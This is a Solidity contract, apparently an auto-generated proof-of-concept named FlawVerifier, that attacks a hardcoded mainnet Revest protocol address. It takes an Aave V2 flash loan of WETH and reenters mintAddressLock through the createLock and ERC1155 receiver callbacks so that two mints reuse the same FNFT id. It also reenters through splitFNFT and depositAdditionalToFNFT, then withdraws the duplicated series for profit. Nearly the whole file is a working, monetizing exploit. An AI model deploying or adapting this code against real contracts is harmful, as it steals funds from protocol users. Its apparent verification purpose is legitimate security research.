pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAddressRegistryLike {
    function getRevestFNFT() external view returns (address);
}

interface IFNFTHandlerLike {
    function getBalance(address tokenHolder, uint256 id) external view returns (uint256);
    function getSupply(uint256 fnftId) external view returns (uint256);
}

interface IRevestLike {
    struct FNFTConfig {
        address asset;
        address pipeToContract;
        uint256 depositAmount;
        uint256 depositMul;
        uint256 split;
        uint256 depositStopTime;
        bool maturityExtension;
        bool isMulti;
        bool nontransferrable;
    }

    function mintAddressLock(
        address trigger,
        bytes calldata arguments,
        address[] calldata recipients,
        uint256[] calldata quantities,
        FNFTConfig calldata fnftConfig
    ) external payable returns (uint256);

    function splitFNFT(
        uint256 fnftId,
        uint256[] calldata proportions,
        uint256 quantity
    ) external returns (uint256[] memory newFNFTIds);

    function depositAdditionalToFNFT(
        uint256 fnftId,
        uint256 amount,
        uint256 quantity
    ) external returns (uint256);

    function withdrawFNFT(uint256 fnftId, uint256 quantity) external;

    function getAddressesProvider() external view returns (IAddressRegistryLike);
}

interface IERC1155ReceiverLike {
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

interface IRegistryProviderLike {
    function setAddressRegistry(address revest) external;
    function getAddressRegistry() external view returns (address);
}

interface IAddressLockLike is IRegistryProviderLike {
    function createLock(uint256 fnftId, uint256 lockId, bytes calldata arguments) external;
    function updateLock(uint256 fnftId, uint256 lockId, bytes calldata arguments) external;
    function isUnlockable(uint256 fnftId, uint256 lockId) external view returns (bool);
    function getDisplayValues(uint256 fnftId, uint256 lockId) external view returns (bytes memory);
    function getMetadata() external view returns (string memory);
    function needsUpdate() external view returns (bool);
}

interface IAaveV2AddressesProviderLike {
    function getLendingPool() external view returns (address);
}

interface IAaveV2LendingPoolLike {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier is IERC1155ReceiverLike, IAddressLockLike {
    address internal constant TARGET = 0x2320A28f52334d62622cc2EaFa15DE55F9987eD9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AAVE_V2_PROVIDER = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;

    bytes4 internal constant ADDRESS_LOCK_INTERFACE_ID = 0x70d7b809;
    uint256 internal constant ZERO = 0;
    uint256 internal constant ONE = 1;
    uint256 internal constant TWO = 2;
    uint256 internal constant FLASH_WETH = 1 ether;
    uint256 internal constant NONE = type(uint256).max;

    enum Mode {
        Idle,
        CreateLockPath,
        ReceiverMintPath,
        SplitPath,
        DepositAdditionalPath,
        MonetizeReceiverPath
    }

    Mode internal mode;
    bool internal inReentry;
    bool internal approvalsReady;
    bool internal collisionObserved;

    uint256 internal callbackId;
    uint256 internal reenteredId;
    uint256 internal observedSupply;
    uint256 internal observedBalance;
    uint256 internal startBalance;
    uint256 internal realizedProfit;

    uint256 internal reentryDepositAmount;
    uint256 internal reentryQuantity;
    bool internal reentryIsMulti;
    uint256 internal reentrySplit;

    uint256 internal monetizedId;
    uint256 internal monetizedChildId;

    string internal usedPath;
    string public lastFailure;
    address internal registry;

    constructor() {}

    function executeOnOpportunity() external {
        // exploit_paths[0]: call `mintAddressLock()` with this contract as the trigger so
        // `IAddressLock.createLock()` can reenter before `fnftsCreated` advances.
        // exploit_paths[1]: mint the ERC1155 to this contract and reenter from
        // `onERC1155Received` / `onERC1155BatchReceived` before the outer mint completes.
        // exploit_paths[2]: if direct monetization is unavailable on this fork, still exercise the
        // post-mint collision branches by calling `splitFNFT()` or `depositAdditionalToFNFT()` and
        // reentering during the intermediate ERC1155 mint that still uses the stale next id.
        startBalance = _wethBalance();
        realizedProfit = 0;
        collisionObserved = false;
        callbackId = NONE;
        reenteredId = NONE;
        observedSupply = 0;
        observedBalance = 0;
        reentryDepositAmount = ZERO;
        reentryQuantity = ONE;
        reentryIsMulti = false;
        reentrySplit = ZERO;
        monetizedId = NONE;
        monetizedChildId = NONE;
        usedPath = "";
        lastFailure = "";
        mode = Mode.Idle;
        inReentry = false;

        _ensureApprovals();

        if (_attemptFlashMonetization()) {
            realizedProfit = _netProfit();
            return;
        }

        if (_attemptCreateLockPath()) {
            realizedProfit = _netProfit();
            return;
        }

        if (_attemptReceiverMintPath()) {
            realizedProfit = _netProfit();
            return;
        }

        if (_attemptSplitPath()) {
            realizedProfit = _netProfit();
            return;
        }

        if (_attemptDepositAdditionalPath()) {
            realizedProfit = _netProfit();
            return;
        }

        realizedProfit = _netProfit();
    }

    function requestFlashLoan(uint256 amount) external {
        require(msg.sender == address(this), "ONLY_SELF");

        address[] memory assets = new address[](1);
        assets[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = ZERO;

        IAaveV2LendingPoolLike(_aavePool()).flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == _aavePool(), "ONLY_AAVE_POOL");
        require(initiator == address(this), "ONLY_SELF_INITIATOR");
        require(assets.length == ONE && assets[0] == WETH, "UNEXPECTED_ASSET");

        _ensureApprovals();

        uint256 flashedAmount = amounts[0];
        uint256 flashFee = premiums[0];

        uint256 outerId = _executeMonetizedReceiverCollision(flashedAmount);
        require(outerId != NONE, "MONETIZE_COLLISION_FAILED");

        bool finalized = this.finalizeMonetization(outerId);
        require(finalized, "MONETIZE_FINALIZE_FAILED");

        IERC20Like(WETH).approve(_aavePool(), flashedAmount + flashFee);
        return true;
    }

    function finalizeMonetization(uint256 collidedId) external returns (bool) {
        require(msg.sender == address(this), "ONLY_SELF");

        uint256 newSeriesId = IRevestLike(TARGET).depositAdditionalToFNFT(collidedId, ZERO, ONE);
        require(newSeriesId != ZERO, "NO_NEW_SERIES");

        monetizedId = collidedId;
        monetizedChildId = newSeriesId;

        // Public post-processing step justified by the finding:
        // once the receiver reentrancy has already caused two economically distinct mints to reuse the same
        // `fnftId`, splitting one unit out through `depositAdditionalToFNFT(..., 0, 1)` materializes the
        // duplicated claim into two separately withdrawable series without changing the root cause.
        IRevestLike(TARGET).withdrawFNFT(newSeriesId, ONE);
        IRevestLike(TARGET).withdrawFNFT(collidedId, ONE);

        collisionObserved = true;
        usedPath = "mintAddressLock_erc1155Receiver_reentrancy_then_depositAdditional_materialization";
        return true;
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (msg.sender != _fnftHandlerAddress()) {
            return this.onERC1155Received.selector;
        }

        callbackId = id;

        if (inReentry) {
            return this.onERC1155Received.selector;
        }

        if (
            mode != Mode.ReceiverMintPath &&
            mode != Mode.SplitPath &&
            mode != Mode.DepositAdditionalPath &&
            mode != Mode.MonetizeReceiverPath
        ) {
            return this.onERC1155Received.selector;
        }

        Mode activeMode = mode;
        inReentry = true;

        reenteredId = _tryMintAddressLock(reentryDepositAmount, reentryQuantity, reentryIsMulti, reentrySplit);
        _recordCollision(id, activeMode);

        inReentry = false;
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == 0x01ffc9a7 || interfaceId == 0x4e2312e0 || interfaceId == ADDRESS_LOCK_INTERFACE_ID;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function exploitPath() external view returns (string memory) {
        return usedPath;
    }

    function hypothesisValidated() external view returns (bool) {
        return collisionObserved;
    }

    function setAddressRegistry(address revest) external {
        registry = revest;
    }

    function getAddressRegistry() external view returns (address) {
        return registry;
    }

    function createLock(uint256, uint256, bytes calldata) external {
        require(msg.sender == TARGET, "ONLY_TARGET");

        if (inReentry || mode != Mode.CreateLockPath) {
            return;
        }

        // exploit_paths[0]: the outer `mintAddressLock()` invokes `IAddressLock.createLock()` here
        // before the handler increments its id counter, so we reenter another mint path immediately.
        inReentry = true;
        reenteredId = _tryMintAddressLock(ZERO, ONE, false, ZERO);
        inReentry = false;
    }

    function updateLock(uint256, uint256, bytes calldata) external view {
        require(msg.sender == TARGET, "ONLY_TARGET");
    }

    function isUnlockable(uint256, uint256) external pure returns (bool) {
        return true;
    }

    function getDisplayValues(uint256, uint256) external pure returns (bytes memory) {
        return bytes("");
    }

    function getMetadata() external pure returns (string memory) {
        return "";
    }

    function needsUpdate() external pure returns (bool) {
        return false;
    }

    function _attemptFlashMonetization() internal returns (bool) {
        try this.requestFlashLoan(FLASH_WETH) {
            if (_netProfit() > 0) {
                return true;
            }
            _noteFailure("MONETIZE_NO_PROFIT");
            return false;
        } catch {
            _noteFailure("MONETIZE_FLASHLOAN_REVERTED");
            return false;
        }
    }

    function _executeMonetizedReceiverCollision(uint256 depositAmount) internal returns (uint256) {
        _resetAttemptState(Mode.MonetizeReceiverPath);

        // We use temporary external funding only because the verifier starts with zero WETH at this fork.
        // The exploit causality itself remains the same documented path:
        // `mintAddressLock()` -> ERC1155 receiver callback -> reentered `mintAddressLock()` before `fnftsCreated` advances.
        uint256 outerId = _tryMintAddressLock(depositAmount, ONE, true, ONE);
        mode = Mode.Idle;

        if (!_recordCollision(outerId, Mode.MonetizeReceiverPath)) {
            return NONE;
        }

        monetizedId = outerId;
        return outerId;
    }

    function _attemptCreateLockPath() internal returns (bool) {
        _resetAttemptState(Mode.CreateLockPath);

        uint256 outerId = _tryMintAddressLock(ZERO, ONE, false, ZERO);
        mode = Mode.Idle;

        if (outerId == NONE) {
            _noteFailure("PATH1_CREATELOCK_OUTER_MINT_REVERTED");
            return false;
        }

        if (_recordCollision(outerId, Mode.CreateLockPath)) {
            return true;
        }

        _noteFailure("PATH1_CREATELOCK_NO_COLLISION");
        return false;
    }

    function _attemptReceiverMintPath() internal returns (bool) {
        _resetAttemptState(Mode.ReceiverMintPath);

        uint256 outerId = _tryMintAddressLock(ZERO, ONE, false, ZERO);
        mode = Mode.Idle;

        if (outerId == NONE) {
            _noteFailure("PATH2_RECEIVER_OUTER_MINT_REVERTED");
            return false;
        }

        if (_recordCollision(outerId, Mode.ReceiverMintPath)) {
            return true;
        }

        _noteFailure("PATH2_RECEIVER_NO_COLLISION");
        return false;
    }

    function _attemptSplitPath() internal returns (bool) {
        uint256 baseId = _tryMintAddressLock(ZERO, ONE, false, ONE);
        if (baseId == NONE) {
            _noteFailure("PATH3_SPLIT_BASE_MINT_REVERTED");
            return false;
        }

        uint256[] memory proportions = new uint256[](2);
        proportions[0] = ONE;
        proportions[1] = ONE;

        _resetAttemptState(Mode.SplitPath);

        uint256[] memory childIds;
        // exploit_paths[2]: call `splitFNFT()` and let the ERC1155 mint callback reenter while the
        // freshly allocated child series id has not yet been committed by FNFTHandler.
        try IRevestLike(TARGET).splitFNFT(baseId, proportions, ONE) returns (uint256[] memory ids) {
            childIds = ids;
        } catch {
            mode = Mode.Idle;
            _noteFailure("PATH3_SPLIT_CALL_REVERTED");
            return false;
        }

        mode = Mode.Idle;

        if (childIds.length == 0) {
            _noteFailure("PATH3_SPLIT_NO_CHILD_IDS");
            return false;
        }

        if (_recordCollision(childIds[0], Mode.SplitPath)) {
            return true;
        }

        _noteFailure("PATH3_SPLIT_NO_COLLISION");
        return false;
    }

    function _attemptDepositAdditionalPath() internal returns (bool) {
        uint256 baseId = _tryMintAddressLock(ZERO, TWO, true, ZERO);
        if (baseId == NONE) {
            _noteFailure("PATH4_DEPOSIT_BASE_MINT_REVERTED");
            return false;
        }

        _resetAttemptState(Mode.DepositAdditionalPath);

        uint256 newSeriesId;
        // exploit_paths[2]: call `depositAdditionalToFNFT()` and reenter during the intermediate
        // ERC1155 mint so the new series collides with a second operation using the same stale id.
        try IRevestLike(TARGET).depositAdditionalToFNFT(baseId, ZERO, ONE) returns (uint256 mintedId) {
            newSeriesId = mintedId;
        } catch {
            mode = Mode.Idle;
            _noteFailure("PATH4_DEPOSIT_CALL_REVERTED");
            return false;
        }

        mode = Mode.Idle;

        if (_recordCollision(newSeriesId, Mode.DepositAdditionalPath)) {
            return true;
        }

        _noteFailure("PATH4_DEPOSIT_NO_COLLISION");
        return false;
    }

    function _resetAttemptState(Mode nextMode) internal {
        mode = nextMode;
        inReentry = false;
        callbackId = NONE;
        reenteredId = NONE;
        observedBalance = 0;
        observedSupply = 0;
        reentryDepositAmount = ZERO;
        reentryQuantity = ONE;
        reentryIsMulti = false;
        reentrySplit = ZERO;
    }

    function _recordCollision(uint256 expectedId, Mode activeMode) internal returns (bool) {
        if (expectedId == NONE || reenteredId != expectedId) {
            if (bytes(lastFailure).length == 0) {
                if (activeMode == Mode.CreateLockPath) {
                    lastFailure = "PATH1_REENTRY_DID_NOT_REUSE_ID";
                } else if (activeMode == Mode.ReceiverMintPath) {
                    lastFailure = "PATH2_REENTRY_DID_NOT_REUSE_ID";
                } else if (activeMode == Mode.SplitPath) {
                    lastFailure = "PATH3_REENTRY_DID_NOT_REUSE_ID";
                } else if (activeMode == Mode.DepositAdditionalPath) {
                    lastFailure = "PATH4_REENTRY_DID_NOT_REUSE_ID";
                } else {
                    lastFailure = "MONETIZE_REENTRY_DID_NOT_REUSE_ID";
                }
            }
            return false;
        }

        observedBalance = _fnftBalance(expectedId);
        observedSupply = _fnftSupply(expectedId);

        if (observedBalance < TWO || observedSupply < TWO) {
            return false;
        }

        collisionObserved = true;
        if (bytes(usedPath).length == 0) {
            if (activeMode == Mode.CreateLockPath) {
                usedPath = "mintAddressLock_createLock_reentrancy";
            } else if (activeMode == Mode.ReceiverMintPath) {
                usedPath = "mintAddressLock_erc1155Receiver_reentrancy";
            } else if (activeMode == Mode.SplitPath) {
                usedPath = "splitFNFT_erc1155Receiver_reentrancy";
            } else if (activeMode == Mode.DepositAdditionalPath) {
                usedPath = "depositAdditionalToFNFT_erc1155Receiver_reentrancy";
            } else {
                usedPath = "mintAddressLock_erc1155Receiver_reentrancy";
            }
        }

        return true;
    }

    function _tryMintAddressLock(
        uint256 depositAmount,
        uint256 quantity,
        bool isMulti,
        uint256 splitCount
    ) internal returns (uint256 mintedId) {
        IRevestLike.FNFTConfig memory config = IRevestLike.FNFTConfig({
            asset: WETH,
            pipeToContract: address(0),
            depositAmount: depositAmount,
            depositMul: ZERO,
            split: splitCount,
            depositStopTime: ZERO,
            maturityExtension: false,
            isMulti: isMulti,
            nontransferrable: false
        });

        address[] memory recipients = new address[](1);
        recipients[0] = address(this);

        uint256[] memory quantities = new uint256[](1);
        quantities[0] = quantity;

        try IRevestLike(TARGET).mintAddressLock(address(this), bytes(""), recipients, quantities, config) returns (
            uint256 id
        ) {
            return id;
        } catch {
            return NONE;
        }
    }

    function _noteFailure(string memory failure) internal {
        if (bytes(lastFailure).length == 0) {
            lastFailure = failure;
        }
    }

    function _ensureApprovals() internal {
        if (approvalsReady) {
            return;
        }

        IERC20Like(WETH).approve(TARGET, type(uint256).max);
        IERC20Like(WETH).approve(_aavePool(), type(uint256).max);
        approvalsReady = true;
    }

    function _aavePool() internal view returns (address) {
        return IAaveV2AddressesProviderLike(AAVE_V2_PROVIDER).getLendingPool();
    }

    function _netProfit() internal view returns (uint256) {
        uint256 endBalance = _wethBalance();
        if (endBalance > startBalance) {
            return endBalance - startBalance;
        }
        return 0;
    }

    function _fnftHandlerAddress() internal view returns (address) {
        return IRevestLike(TARGET).getAddressesProvider().getRevestFNFT();
    }

    function _fnftBalance(uint256 fnftId) internal view returns (uint256) {
        if (fnftId == NONE) {
            return 0;
        }
        return IFNFTHandlerLike(_fnftHandlerAddress()).getBalance(address(this), fnftId);
    }

    function _fnftSupply(uint256 fnftId) internal view returns (uint256) {
        if (fnftId == NONE) {
            return 0;
        }
        return IFNFTHandlerLike(_fnftHandlerAddress()).getSupply(fnftId);
    }

    function _wethBalance() internal view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this));
    }
}
